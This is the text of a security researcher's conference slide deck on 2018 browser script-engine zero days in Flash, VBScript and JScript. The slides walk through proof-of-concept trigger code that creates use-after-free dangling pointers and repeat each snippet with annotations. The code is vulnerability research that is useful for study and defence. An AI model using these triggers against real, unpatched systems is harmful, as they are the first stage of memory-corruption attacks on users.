Browser Script Engine 
Zero Days in 2018
Elliot Cao
Trend Micro
2019-05-30
Whoami
• Previous occupation is electrical engineer
• Joined in Trend Micro in 2017
• Sandbox developer
• Started browser vulnerability research in 2018
• Focus on browser script engine
• Lei Cao (@elli0tn0phacker)
Agenda
• Browser Zero Days in 2018
• VBSEmulator
• Chakra
Browser Zero Days in 2018
Browser Zero Days in 2018
• Flash:       CVE-2018-4878 CVE-2018-15982
• VBScript:  CVE-2018-8174 CVE-2018-8373
• JScript:     CVE-2018-8653
Flash Zero Days in 2018
• CVE-2018-4878
var psdk:PSDK = PSDK.pSDK;
var psdk_dispatcher:PSDKEventDispatcher = psdk.createDispatcher();
this.mediaPlayer = psdk.createMediaPlayer(psdk_dispatcher);
this.my_DRMListerner = new DRMOperationCompleteListener ();
this.mediaPlayer.drmManager.initialize(this.my_DRMListerner);
this.my_DRMListerner = null;
try {
new LocalConnection().connect("foo");
new LocalConnection().connect("foo");
}
catch (e:Error) {
my_DRMListerner_vuln = new DRMOperationCompleteListener ();
}
Flash Zero Days in 2018
• CVE-2018-4878
Create an Object
var psdk:PSDK = PSDK.pSDK;
var psdk_dispatcher:PSDKEventDispatcher = psdk.createDispatcher();
this.mediaPlayer = psdk.createMediaPlayer(psdk_dispatcher);
this.my_DRMListerner = new DRMOperationCompleteListener ();
this.mediaPlayer.drmManager.initialize(this.my_DRMListerner);
this.my_DRMListerner = null;
try {
new LocalConnection().connect("foo");
new LocalConnection().connect("foo");
}
catch (e:Error) {
my_DRMListerner_vuln = new DRMOperationCompleteListener ();
}
var psdk:PSDK = PSDK.pSDK;
var psdk_dispatcher:PSDKEventDispatcher = psdk.createDispatcher();
this.mediaPlayer = psdk.createMediaPlayer(psdk_dispatcher);
this.my_DRMListerner = new DRMOperationCompleteListener ();
this.mediaPlayer.drmManager.initialize(this.my_DRMListerner);
this.my_DRMListerner = null;
try {
new LocalConnection().connect("foo");
new LocalConnection().connect("foo");
}
catch (e:Error) {
my_DRMListerner_vuln = new DRMOperationCompleteListener ();
}
Flash Zero Days in 2018
• CVE-2018-4878
Free the Object
Flash Zero Days in 2018
• CVE-2018-4878
Reuse free memory
Trigger GC,
Get a dangling pointer
my_DRMListerner_vuln
var psdk:PSDK = PSDK.pSDK;
var psdk_dispatcher:PSDKEventDispatcher = psdk.createDispatcher();
this.mediaPlayer = psdk.createMediaPlayer(psdk_dispatcher);
this.my_DRMListerner = new DRMOperationCompleteListener ();
this.mediaPlayer.drmManager.initialize(this.my_DRMListerner);
this.my_DRMListerner = null;
try {
new LocalConnection().connect("foo");
new LocalConnection().connect("foo");
}
catch (e:Error) {
my_DRMListerner_vuln = new DRMOperationCompleteListener ();
}
Flash Zero Days in 2018
• CVE-2018-15982
var ba:ByteArray = new ByteArray();
var md:Metadata = new Metadata();
var arr_key:* = null;
i = 0;
while (i < 0x100) {
md.setObject(i.toString(), ba);
i++;
}
try{
new LocalConnection().connect("foo");
new LocalConnection().connect("foo");
} 
catch (e:Error){}
arr_key = md.keySet;
Flash Zero Days in 2018
• CVE-2018-15982
var ba:ByteArray = new ByteArray();
var md:Metadata = new Metadata();
var arr_key:* = null;
i = 0;
while (i < 0x100) {
md.setObject(i.toString(), ba);
i++;
}
try{
new LocalConnection().connect("foo");
new LocalConnection().connect("foo");
} 
catch (e:Error){}
arr_key = md.keySet;
Create some String object 
and save them to Metadata
Flash Zero Days in 2018
• CVE-2018-15982
var ba:ByteArray = new ByteArray();
var md:Metadata = new Metadata();
var arr_key:* = null;
i = 0;
while (i < 0x100) {
md.setObject(i.toString(), ba);
i++;
}
try{
new LocalConnection().connect("foo");
new LocalConnection().connect("foo");
} 
catch (e:Error){}
arr_key = md.keySet;
Flash Zero Days in 2018
• CVE-2018-15982
var ba:ByteArray = new ByteArray();
var md:Metadata = new Metadata();
var arr_key:* = null;
i = 0;
while (i < 0x100) {
md.setObject(i.toString(), ba);
i++;
}
try{
new LocalConnection().connect("foo");
new LocalConnection().connect("foo");
} 
catch (e:Error){}
arr_key = md.keySet;
Trigger GC
Flash Zero Days in 2018
• CVE-2018-15982
var ba:ByteArray = new ByteArray();
var md:Metadata = new Metadata();
var arr_key:* = null;
i = 0;
while (i < 0x100) {
md.setObject(i.toString(), ba);
i++;
}
try{
new LocalConnection().connect("foo");
new LocalConnection().connect("foo");
} 
catch (e:Error){}
arr_key = md.keySet;
Get dangling pointers
arr_key
VBScript Zero Days in 2018
• CVE-2018-8174
Dim arr(1)
Dim o
Class MyClass
Private Sub Class_Terminate
Set o = arr(0)
arr(0) = &h12345678
End Sub
End Class
Set arr(0) = New MyClass
Erase arr
msgbox o
VBScript Zero Days in 2018
• CVE-2018-8174
Dim arr(1)
Dim o
Class MyClass
Private Sub Class_Terminate
Set o = arr(0)
arr(0) = &h12345678
End Sub
End Class
Set arr(0) = New MyClass
Erase arr
msgbox o
Create one MyClass object 
and save its pointer to arr(0)
VBScript Zero Days in 2018
• CVE-2018-8174
Dim arr(1)
Dim o
Class MyClass
Private Sub Class_Terminate
Set o = arr(0)
arr(0) = &h12345678
End Sub
End Class
Set arr(0) = New MyClass
Erase arr
msgbox o
VBScript Zero Days in 2018
• CVE-2018-8174
Dim arr(1)
Dim o
Class MyClass
Private Sub Class_Terminate
Set o = arr(0)
arr(0) = &h12345678
End Sub
End Class
Set arr(0) = New MyClass
Erase arr
msgbox o
Save MyClass object
pointer to variable o 
VBScript Zero Days in 2018
• CVE-2018-8174
Dim arr(1)
Dim o
Class MyClass
Private Sub Class_Terminate
Set o = arr(0)
arr(0) = &h12345678
End Sub
End Class
Set arr(0) = New MyClass
Erase arr
msgbox o
Get a dangling pointer
VBScript Zero Days in 2018
• CVE-2018-8373
Dim arr()
ReDim arr(2)
Class MyClass
Public Default Property Get P
ReDim arr(1)
End Sub
End Class
arr(2) = New MyClass
VBScript Zero Days in 2018
• CVE-2018-8373
Dim arr()
ReDim arr(2)
Class MyClass
Public Default Property Get P
ReDim arr(1)
End Sub
End Class
arr(2) = New MyClass
Save the arr(2) address on the stack
VBScript Zero Days in 2018
• CVE-2018-8373
Dim arr()
ReDim arr(2)
Class MyClass
Public Default Property Get P
ReDim arr(1)
End Sub
End Class
arr(2) = New MyClass
VBScript Zero Days in 2018
• CVE-2018-8373
Dim arr()
ReDim arr(2)
Class MyClass
Public Default Property Get P
ReDim arr(1)
End Sub
End Class
arr(2) = New MyClass
Original array buffer 
will be freed by |ReDim|
VBScript Zero Days in 2018
• CVE-2018-8373
Dim arr()
ReDim arr(2)
Class MyClass
Public Default Property Get P
ReDim arr(1)
End Sub
End Class
arr(2) = New MyClass
Get a dangling pointer
JScript Zero Days in 2018
• CVE-2018-8653
…
for (var i = 0; i < limit; i++) {       
var arr = new Array({prototype:{}});
var e = new Enumerator(arr);
e.moveFirst();
refs[i] = e.item();
}
for (var i = 0; i < limit; i++) {
refs[i].prototype = {};
refs[i].prototype.isPrototypeOf = getFreeRef;
}
…
dummyObj instanceof refs[0];
JScript Zero Days in 2018
• CVE-2018-8653
…
for (var i = 0; i < limit; i++) {       
var arr = new Array({prototype:{}});
var e = new Enumerator(arr);
e.moveFirst();
refs[i] = e.item();
}
for (var i = 0; i < limit; i++) {
refs[i].prototype = {};
refs[i].prototype.isPrototypeOf = getFreeRef;
}
…
dummyObj instanceof refs[0];
Create an array contains object has prototype object
JScript Zero Days in 2018
• CVE-2018-8653
…
for (var i = 0; i < limit; i++) {       
var arr = new Array({prototype:{}});
var e = new Enumerator(arr);
e.moveFirst();
refs[i] = e.item();
}
for (var i = 0; i < limit; i++) {
refs[i].prototype = {};
refs[i].prototype.isPrototypeOf = getFreeRef;
}
…
dummyObj instanceof refs[0];
Set the prototype object isPrototypeOf
to |getFreeRef| callback
JScript Zero Days in 2018
• CVE-2018-8653
…
for (var i = 0; i < limit; i++) {       
var arr = new Array({prototype:{}});
var e = new Enumerator(arr);
e.moveFirst();
refs[i] = e.item();
}
for (var i = 0; i < limit; i++) {
refs[i].prototype = {};
refs[i].prototype.isPrototypeOf = getFreeRef;
}
…
dummyObj instanceof refs[0];
Trigger |getFreeRef| callback
JScript Zero Days in 2018
• CVE-2018-8653
function getFreeRef() {            
if (count == limit) {                      
…
for (var i = 0; i < limit; i++) {
refs[i].prototype = 0;
}
CollectGarbage();               
} else {
dummyObj instanceof refs[count++];
}            
// crash here
this;           
return false;
}
recursive calls to put |this| on the stack
JScript Zero Days in 2018
• CVE-2018-8653
function getFreeRef() {            
if (count == limit) {                      
…
for (var i = 0; i < limit; i++) {
refs[i].prototype = 0;
}
CollectGarbage();               
} else {
dummyObj instanceof refs[count++];
}            
// crash here
this;           
return false;
}
Break out and release prototype object
by garbage collection
JScript Zero Days in 2018
• CVE-2018-8653
function getFreeRef() {            
if (count == limit) {                      
…
for (var i = 0; i < limit; i++) {
refs[i].prototype = 0;
}